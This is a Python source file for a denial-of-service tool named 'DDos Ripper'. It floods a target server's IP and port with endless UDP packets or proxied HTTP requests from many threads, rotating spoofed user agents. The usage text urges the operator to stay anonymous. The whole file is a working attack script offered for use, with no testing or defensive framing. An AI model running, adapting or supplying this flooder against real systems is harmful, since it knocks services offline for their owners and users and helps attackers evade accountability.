from optparse import OptionParser
import time, sys, socket, threading, random, urllib.request


def user_agent():
    global uagent
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    uagent.append("Mozilla / 5.0(X11;Linux i686; rv:81.0) Gecko / 20100101 Firefox / 81.0")
    uagent.append("Mozilla / 5.0(Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
    uagent.append("Mozilla / 5.0(X11;Ubuntu;Linuxi686;rv:81.0) Gecko / 20100101Firefox / 81.0")
    uagent.append("Mozilla / 5.0(X11;Ubuntu;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
    uagent.append("Mozilla / 5.0(X11;Fedora;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
    return (uagent)


def headers():
    # reading headers
    global data
    headers = open("headers.txt", "r")
    data = headers.read()
    headers.close()


def set_proxies():
    # reading proxies
    global proxies
    f = open(proxies_file, "r")
    proxies = f.readlines()
    f.close()


def down_it_proxy():
   while True:
        p = random.choice(proxies)
        req = urllib.request.Request(f"http://{host}:{port}", headers={'User-Agent': random.choice(uagent)})
        req.set_proxy(p, 'http')
        try:
            urllib.request.urlopen(req)
        except:
            pass

        print('Packet was sent')

        # packet = str(
        #     "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode(
        #     'utf-8')
        #
        # proxy_host, proxy_port = random.choice(proxies).split(':')
        #
        # try:
        #     s.connect((proxy_host, int(proxy_port)))
        # except:
        #     print(f"Connection with proxy failed: {proxy_host}:{proxy_port}")
        #     s.close()
        # else:
        #     s.send(packet)
        #     s.close()
        #     print('Packet was sent')


def down_it():
    while True:
        packet = str(
            "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode(
            'utf-8')
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(packet, (host, int(port)))
        s.close()
        print('Packet was sent')
        # time.sleep(.01)


def usage():
    print(''' \033[0;95mDDos Ripper 

	It is the end user's responsibility to obey all applicable laws.
	It is just like a server testing script and Your ip is visible. Please, make sure you are anonymous! \n
	Usage : python3 dripper.py [-s] [-p] [-t] [-pr]
	-h : -help
	-s : -server ip
	-p : -port default 80
	-t : -threads default 100
	-pr : -proxies list (file) \033[0m ''')

    sys.exit()


def get_parameters():
    global host
    global port
    global thr
    global item
    global proxies_file
    optp = OptionParser(add_help_option=False, epilog="Rippers")
    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--threads", type="int", dest="threads", help="default 100")
    optp.add_option("-l", "--proxies-list", type="str", dest="proxies_file", help="proxies list file")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    opts, args = optp.parse_args()
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port

    if opts.threads is None:
        thr = 100
    else:
        thr = opts.threads

    if opts.proxies_file is not None:
        proxies_file = opts.proxies_file
    else:
        proxies_file = None


if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print("\033[92m", host, " port: ", str(port), " threads: ", str(thr), "\033[0m")
    print("\033[94mPlease wait...\033[0m")
    user_agent()
    headers()
    if proxies_file:
        set_proxies()
    time.sleep(5)

    thrs = []
    for i in range(int(thr)):
        # t = threading.Thread(target=down_it)
        if proxies_file:
            thrs.append(threading.Thread(target=down_it_proxy))
        else:
            thrs.append(threading.Thread(target=down_it))
        thrs[i].daemon = True  # if thread is exist, it dies
        thrs[i].start()

    while True:
        time.sleep(.1)
